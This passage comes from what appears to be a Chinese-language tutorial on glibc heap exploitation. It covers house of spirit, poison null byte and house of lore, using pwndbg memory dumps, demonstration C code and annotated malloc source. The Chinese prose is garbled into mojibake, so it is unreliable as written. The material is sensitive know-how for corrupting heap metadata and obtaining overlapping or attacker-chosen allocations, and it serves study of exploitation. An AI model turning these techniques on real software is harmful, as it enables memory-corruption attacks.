class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p a                                                        </span><br><span class="line"><span class="variable">$11</span> = (unsigned long long *) 0x7fffffffe380--&gt; <span class="variable">$9</span> = (unsigned long long **) 0x7fffffffe368</span><br></pre></td></tr></table></figure><p>æˆåŠŸæŒ‡å‘äº† fake chunkã€‚å½“æˆ‘free açš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°† fake chunk å½“åšä¸€å—fastbins å¤„ç†ï¼Œæ”¾åˆ°fastbinsæ•°ç»„é‡Œã€‚å½“æˆ‘ä»¬å†mallocçš„æ—¶å€™ã€‚æˆ‘ä»¬å°±å¾—åˆ°ä¸€å—æŒ‡å‘ stack çš„ chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fffffffe370</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>è¿™æ—¶å¦‚æœæˆ‘ä»¬ malloc ä¸€ä¸ªå¯¹åº”å¤§å°çš„ fast chunkï¼Œç¨‹åºå°†ä» fastbins ä¸­åˆ†é…å‡ºè¿™å—è¢«é‡Šæ”¾çš„ chunkã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/10gx &amp;fake_chunks</span><br><span class="line">0x7fffffffe370:0x00000000000000c20x0000000000000040</span><br><span class="line">0x7fffffffe380:0x00000000000000000x00007ffff7ababe5</span><br><span class="line">0x7fffffffe390:0x00000000000000010x00000000004008ed</span><br><span class="line">0x7fffffffe3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe3b0:0x00000000004008a00x0000000000001234</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ house-of-spirit çš„ä¸»è¦ç›®çš„æ˜¯ï¼Œå½“æˆ‘ä»¬ä¼ªé€ çš„ fake chunk å†…éƒ¨å­˜åœ¨ä¸å¯æ§åŒºåŸŸæ—¶ï¼Œè¿ç”¨è¿™ä¸€æŠ€æœ¯å¯ä»¥å°†è¿™ç‰‡åŒºåŸŸå˜æˆå¯æ§çš„ã€‚ä¸Šé¢ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿï¼Œåœ¨ fake chunk é‡Œå¡«å……ä¸€äº›å­—æ¯ï¼Œä½†åœ¨ç°å®ä¸­è¿™äº›ä½ç½®å¾ˆå¯èƒ½æ˜¯ä¸å¯æ§çš„ï¼Œè€Œ house-of-spirit ä¹Ÿæ­£æ˜¯ä»¥æ­¤ä¸ºç›®çš„è€Œå‡ºç°çš„ã€‚</p><p>è¯¥æŠ€æœ¯çš„ç¼ºç‚¹ä¹Ÿæ˜¯éœ€è¦å¯¹æ ˆåœ°å€è¿›è¡Œæ³„æ¼ï¼Œå¦åˆ™æ— æ³•æ­£ç¡®è¦†ç›–éœ€è¦é‡Šæ”¾çš„å †æŒ‡é’ˆï¼Œä¸”åœ¨æ„é€ æ•°æ®æ—¶ï¼Œéœ€è¦æ»¡è¶³å¯¹é½çš„è¦æ±‚ç­‰ã€‚</p><h3 id="0x07-poison-null-byte"><a href="#0x07-poison-null-byte" class="headerlink" title="0x07 poison_null_byte"></a>0x07 poison_null_byte</h3><p>off-one-by-one çš„ç»å…¸ä¾‹å­ï¼Œä¸€ä¸ª0å­—èŠ‚æº¢å‡ºã€‚åœ¨ä¸€ä¸ªå­—èŠ‚æº¢å‡ºä¸­ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹æƒ…æ™¯ï¼š</p><ol><li>æ‰©å±•å—</li><li>æ”¶ç¼©å—</li></ol><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºäº† a b c barrier å››ä¸ªchunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ barrier è¿™ä¸ªchunkæ˜¯ç”¨æ¥é˜²æ­¢ free c çš„æ—¶å€™è¢«æ”¾å…¥ top-chunkã€‚ä»¥åŠ b c çš„ chunk å¤§å°ä¸èƒ½ä¸º fastbins chunk sizeã€‚å› ä¸º fastbins chunk åœ¨è¢«é‡Šæ”¾åä¸ä¼šåˆå¹¶ã€‚chunk açš„ä½œç”¨æ˜¯ç”¨æ¥åˆ¶é€ å•å­—èŠ‚æº¢å‡ºã€‚</p><p>åœ¨è¿›è¡Œä¸€å­—èŠ‚æº¢å‡ºä¹‹å‰ï¼Œç”±äºæˆ‘ä»¬é€šè¿‡ chunk a çš„å•å­—èŠ‚æº¢å‡ºä¿®æ”¹äº† chunk b çš„ size ï¼Œä¸ºäº†ç»•è¿‡ unlink çš„checnk ï¼Œæˆ‘ä»¬å…ˆä¼ªé€ ä¸€ä¸ª c prev_sizeã€‚ è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.prev_size = b_size &amp; 0xff00</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png"></a></p><p>è®¡ç®—ç»“æœå°±æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x200 = 0x211 &amp; 0xff00</span><br></pre></td></tr></table></figure><p>æ­£å¥½æ˜¯ NULL å­—èŠ‚æº¢å‡ºä¹‹åçš„å€¼ã€‚ç´§æ¥ç€æˆ‘ä»¬ free æ‰ chunk bã€‚æ­¤æ—¶ chunk å¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/124gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000111         &lt;-- chunk a</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000211      &lt;--- chunk b [was free]</span><br><span class="line">0x603120:0x00007ffff7dd1b580x00007ffff7dd1b58           fd ,bk</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">0x603140:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000002000x0000000000000000          fake c.prev.size </span><br><span class="line">0x603320:0x00000000000002100x0000000000000110    &lt;--- chunk c</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000000</span><br><span class="line">0x603360:0x00000000000000000x0000000000000000</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line">0x603380:0x00000000000000000x0000000000000000</span><br><span class="line">0x603390:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>Free list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603110 â€”â–¸ 0x7ffff7dd1b58 (main_arena+88) â—‚â€” 0x603110</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åˆ©ç”¨ ä¸€å­—èŠ‚æº¢å‡º ä¿®æ”¹ chunk b sizeã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png"></a></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç° chunk b çš„ size å·²ç»æˆåŠŸè¢«ä¿®æ”¹ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿ fake äº† ä¸ª chunk cã€‚</p><p>*** bypass : chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))** </p><p>ç´§æ¥ç€æˆ‘ä»¬ create chunk b1 ï¼Œç³»ç»Ÿä¼šä» free æ‰çš„chunk b ä¸­ï¼ˆå·²ç»æ”¾å…¥ unsortedbin å–å‡ºåˆé€‚çš„å¤§å°ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p b1</span><br><span class="line"><span class="variable">$25</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br><span class="line">PwnLife&gt; p b</span><br><span class="line"><span class="variable">$26</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png"></a></p><p>æˆ‘ä»¬æ³¨æ„åˆ°å‡ ä¸ªåœ°æ–¹ï¼š</p><ol><li>chunk b1 çš„ä½ç½®å°±æ˜¯ chunk b çš„ä½ç½®</li><li>è¿™ä¸ªæ—¶å€™ b1 å’Œ c ä¹‹é—´æœ‰ä¸ª chunk bï¼Œè¿™ä¸ªæ—¶å€™ chunk c çš„ prev_size æœ¬åº”è¯¥å˜ä¸º 0xf0ã€‚ä½†æ˜¯äº‹å®ä¸Šæ˜¯</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/30gx 0x603330-0x20</span><br><span class="line">0x603310:0x00000000000000f00x0000000000000000              &lt; --- fake chunk c </span><br><span class="line">0x603320:0x00000000000002100x0000000000000110        &lt; --- chunk c</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000000</span><br><span class="line">0x603360:0x00000000000000000x0000000000000000</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line">0x603380:0x00000000000000000x0000000000000000</span><br><span class="line">0x603390:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6033f0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; p c</span><br><span class="line"><span class="variable">$30</span> = (uint8_t *) 0x603330 <span class="string">&quot;&quot;</span>               &lt;--- chunk c ptr</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç”±äºæˆ‘ä»¬ fake äº†ä¸€ä¸ª c.prev_size ç³»ç»Ÿä¿®æ”¹çš„æ˜¯æˆ‘ä»¬çš„ fake  c.prev_sizeã€‚æ‰€ä»¥ chunk c ä¾ç„¶è®¤ä¸º chunk b çš„åœ°æ–¹æœ‰ä¸€ä¸ªå¤§å°ä¸º 0x210 çš„ free chunk ã€‚ç„¶åæˆ‘ä»¬åœ¨ create ä¸€ä¸ª chunk b2ã€‚</p><p>ç„¶åå°±æ˜¯ï¼Œæˆ‘ä»¬å…ˆå free b1 ï¼Œcã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span> <span class="built_in">free</span>(b1);</span><br><span class="line"><span class="number">96</span> <span class="built_in">free</span>(c);</span><br></pre></td></tr></table></figure><p>å…ˆ free b1ï¼Œè¿™ä¸ªæ—¶å€™ chunk c ä¼šè®¤ä¸º b1 å°±æ˜¯ chunk bã€‚å½“æˆ‘ä»¬ free chunk c çš„æ—¶å€™ï¼Œchunkä¼šå’Œchunk b1åˆå¹¶ã€‚ç”±äº chunk c è®¤ä¸º chunk b1 ä¾æ—§æ˜¯ chunk bã€‚å› æ­¤ä¼šæŠŠä¸­é—´çš„ chunk c åå¹¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x321,</span><br><span class="line">  fd = 0x6032b0,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png"></a></p><p>æ­¤æ—¶ chunk b2 å·²ç»è¢«åå¹¶ã€‚</p><p>ç„¶åæˆ‘ä»¬åœ¨æŠŠè¿™å— chunk createå‡ºæ¥ã€‚å‡è®¾æˆ‘ä»¬ä¹‹å‰å¯¹ chunk b2 å†™çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚æ­¤æ—¶æˆ‘ä»¬ å¾—åˆ°çš„æ–° chunk dã€‚æˆ‘ä»¬å¯ä»¥å¯¹chunk b2çš„å†…å®¹è¿›è¡Œä»»æ„è¯»å†™äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">98</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">   <span class="number">99</span> d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">100</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">  <span class="number">101</span></span><br><span class="line">â–º <span class="number">102</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">  <span class="number">103</span> <span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">  <span class="number">105</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure><h3 id="0x08-house-of-lore"><a href="#0x08-house-of-lore" class="headerlink" title="0x08 house_of_lore"></a>0x08 house_of_lore</h3><p>house of lore æŠ€æœ¯ä¸»è¦æ˜¯ç”¨æ¥ä¼ªé€ ä¸€ä¸ª small bin é“¾ã€‚</p><ul><li><p>House of Lore æ”»å‡»ä¸ Glibc å †ç®¡ç†ä¸­çš„çš„ Small Bin çš„æœºåˆ¶ç´§å¯†ç›¸å…³ã€‚</p></li><li><p>House of Lore å¯ä»¥å®ç°åˆ†é…ä»»æ„æŒ‡å®šä½ç½®çš„ chunkï¼Œä»è€Œä¿®æ”¹ä»»æ„åœ°å€çš„å†…å­˜ã€‚</p></li><li><p>House of Lore åˆ©ç”¨çš„å‰ææ˜¯éœ€è¦æ§åˆ¶ Small Bin Chunk çš„ bk æŒ‡é’ˆï¼Œå¹¶ä¸”æ§åˆ¶æŒ‡å®šä½ç½® chunk çš„ fd æŒ‡é’ˆã€‚</p></li></ul><p>å¦‚æœåœ¨ malloc çš„æ—¶å€™ï¼Œç”³è¯·çš„å†…å­˜å—åœ¨ small bin èŒƒå›´å†…ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    &#x2F;&#x2F; è·å– small bin çš„ç´¢å¼•</span><br><span class="line">    idx &#x3D; smallbin_index(nb);</span><br><span class="line">    &#x2F;&#x2F; è·å–å¯¹åº” small bin ä¸­çš„ chunk æŒ‡é’ˆ</span><br><span class="line">    bin &#x3D; bin_at(av, idx);</span><br><span class="line">    &#x2F;&#x2F; å…ˆæ‰§è¡Œ victim&#x3D; last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk</span><br><span class="line">    &#x2F;&#x2F; å¦‚æœ victim &#x3D; bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚</span><br><span class="line">    &#x2F;&#x2F; å¦‚æœä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ç§æƒ…å†µ</span><br><span class="line">    if ((victim &#x3D; last(bin)) !&#x3D; bin) &#123;</span><br><span class="line">        &#x2F;&#x2F; ç¬¬ä¸€ç§æƒ…å†µï¼Œsmall bin è¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚</span><br><span class="line">        if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;</span><br><span class="line">            &#x2F;&#x2F; æ‰§è¡Œåˆå§‹åŒ–ï¼Œå°† fast bins ä¸­çš„ chunk è¿›è¡Œåˆå¹¶</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        &#x2F;&#x2F; ç¬¬äºŒç§æƒ…å†µï¼Œsmall bin ä¸­å­˜åœ¨ç©ºé—²çš„ chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span><br><span class="line">            bck &#x3D; victim-&gt;bk;</span><br><span class="line">            &#x2F;&#x2F; æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">                errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            &#x2F;&#x2F; ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span><br><span class="line">            bin-&gt;bk &#x3D; bck;</span><br><span class="line">            bck-&gt;fd &#x3D; bin;</span><br><span class="line">            &#x2F;&#x2F; å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—</span><br><span class="line">            if (av !&#x3D; &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            &#x2F;&#x2F; ç»†è‡´çš„æ£€æŸ¥</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            &#x2F;&#x2F; å°†ç”³è¯·åˆ°çš„ chunk è½¬åŒ–ä¸ºå¯¹åº”çš„ mem çŠ¶æ€</span><br><span class="line">            void *p &#x3D; chunk2mem(victim);</span><br><span class="line">            &#x2F;&#x2F; å¦‚æœè®¾ç½®äº† perturb_type , åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸‹é¢çš„è¿™éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥çœ‹å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span><br><span class="line">bck &#x3D; victim-&gt;bk;</span><br><span class="line">&#x2F;&#x2F; æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">    errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">&#x2F;&#x2F; ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span><br><span class="line">bin-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; bin;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ small bin çš„æœ€åä¸€ä¸ª chunk çš„ bk ä¸ºæˆ‘ä»¬æŒ‡å®šå†…å­˜åœ°å€çš„fake chunkï¼Œå¹¶ä¸”åŒæ—¶æ»¡è¶³ä¹‹åçš„ bck-&gt;fd != victim çš„æ£€æµ‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿å¾— small bin çš„ bk æ°å¥½ä¸ºæˆ‘ä»¬æ„é€ çš„ fake chunkã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸‹ä¸€æ¬¡ç”³è¯· small bin çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šåˆ†é…åˆ°æŒ‡å®šä½ç½®çš„ fake chunã€‚</p><p>è°ƒè¯•ï¼š</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª small bin 